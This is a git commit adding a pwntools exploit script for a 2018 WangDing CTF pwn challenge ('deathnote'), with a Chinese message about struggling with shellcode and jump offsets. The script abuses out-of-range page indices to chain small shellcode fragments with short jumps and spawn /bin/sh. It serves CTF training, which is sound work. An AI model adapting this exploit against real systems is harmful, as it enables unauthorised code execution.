485485f969dcf069d85bce25859cc2902ded5c8c
cossack9989 <wangzhong9989@126.com>
2018-08-29 17:18:26 +0800

    这道题……显示卡在shellcode编写上……后来又卡在跳转指令相对地址上……哎……还是要加强基本功练习

---
+++ PWN/2018WangDing/2018WangDing-3/pwn2-note/exp2.py
@@ -0,0 +1,41 @@
+from pwn import *
+from binascii import hexlify
+
+context.os='linux'
+context.arch='amd64'
+
+r=process('./deathnote')
+r.recvuntil('tell me your name:')
+r.sendline('/bin/sh\x00')
+
+def obWriteName(index,size,content):
+	r.sendlineafter('choice>>','1')
+	r.sendlineafter('Page:',str(index))
+	r.sendlineafter('Size:',str(size))
+	raw_input()
+	r.sendlineafter('Name:',content)
+def WriteName(index,size,content):
+	r.sendlineafter('choice>>','1')
+	r.sendlineafter('Page:',str(index))
+	r.sendlineafter('Size:',str(size))
+	r.sendlineafter('Name:',content)
+def ShowName(index):
+	r.sendlineafter('choice>>','3')
+	r.sendlineafter('Page:',str(index))
+asmcode='''
+xor eax,eax;
+xor edx,edx;
+mov al,59;
+syscall;
+ret;
+'''
+shellcode=asm(asmcode)
+print asmcode,len(shellcode),hexlify(shellcode)
+
+WriteName(0,4,asm('ret;'))
+WriteName(1,4,asm('syscall;')+'\xeb\xdc')
+WriteName(2,4,asm('mov al,59;')+'\xeb\xdc')
+WriteName(3,4,asm('xor edx,edx;')+'\xeb\xdc')
+obWriteName(0xFFFFFFFF-24,4,asm('xor eax,eax;')+'\xeb\xdc')
+ShowName(0xFFFFFFFF-3)
+r.interactive()
